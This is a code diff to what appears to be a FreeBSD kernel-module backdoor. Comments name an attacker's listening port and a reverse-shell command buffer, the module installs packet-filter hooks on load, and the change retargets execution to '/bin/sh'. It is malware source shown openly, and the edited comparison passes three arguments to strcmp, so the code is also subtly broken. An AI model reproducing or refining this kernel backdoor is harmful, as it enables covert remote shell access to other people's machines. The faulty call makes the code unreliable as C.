@@ -41,7 +41,7 @@ extern int kern_execve(struct thread *td, struct image_args *args, struct mac *m
 // define port that attacker needs to listen on
 #define LISTEN_PORT 7000
 // define the name of the process we will fork and kern_execve() in
-#define TARGET_PROC "apeshit"
+#define TARGET_PROC "/bin/sh"
 // Global dynamic string for reverse shell
 char reverse_shell_cmd[100];
 // Define stack protection so we can use snprintf
@@ -196,12 +196,14 @@ static void unload_custom_fork_event_handler(void) {
 static struct proc *find_process_by_name(const char *name) {
 
     struct proc *p;
+    size_t name_len = strlen(name);
 
     sx_slock(&allproc_lock);  // Lock process list
     LIST_FOREACH(p, &allproc, p_list) {
         PROC_LOCK(p);
-        if (strcmp(p->p_comm, name) == 0) {
+        if (strcmp(p->p_comm, name, name_len) == 0) {
             PROC_UNLOCK(p);
+            printf("got one\n");
             sx_sunlock(&allproc_lock);
             return p;  // Return first found instance
         }
@@ -386,11 +388,6 @@ static void unload(void) {
 static int event_handler(struct module *module, int event, void *arg) {
     switch (event) {
         case MOD_LOAD:
-            // load_head_case = load_head();
-            // load_hook_case = load_hook();
-            // load_link_case = load_link();
-            // load_head();
-            // should test is we actually got each one before continueing 
             get_pfil_head();
             load_hook();
             load_link();
